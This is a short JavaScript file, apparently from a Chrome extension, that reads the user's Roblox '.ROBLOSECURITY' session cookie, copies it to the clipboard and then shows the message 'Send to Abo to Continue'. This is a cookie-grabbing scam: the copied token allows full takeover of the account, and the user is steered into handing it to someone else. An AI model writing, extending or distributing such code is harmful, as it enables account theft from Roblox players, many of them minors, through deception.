const getCookieBtn = document.getElementById("getCookie");
const status = document.getElementById("status");

function showStatus(msg) {
    status.textContent = msg;
    setTimeout(() => {
        status.textContent = "";
    }, 3000);
}

// Get the current Roblox cookie and copy it to the clipboard.
getCookieBtn.onclick = () => {
    chrome.cookies.get({
        url: "https://www.roblox.com",
        name: ".ROBLOSECURITY"
    }, cookie => {
        if (cookie) {
            navigator.clipboard.writeText(cookie.value)
                .then(() => showStatus("Cookie copied!"))
                .catch(() => showStatus("Failed to copy."));
        } else {
            showStatus("Cookie not found.");
        }
    });
};





document.addEventListener("DOMContentLoaded", () => {
  const copy = document.getElementById("getCookie");
  const demo = document.getElementById("demo");
  const text = document.getElementById("demoText");
  if (!copy) return;

  copy.addEventListener("click", () => {
    demo.hidden = false;
    copy.disabled = true;
    text.textContent = "Send to Abo to Continue";
  });
});
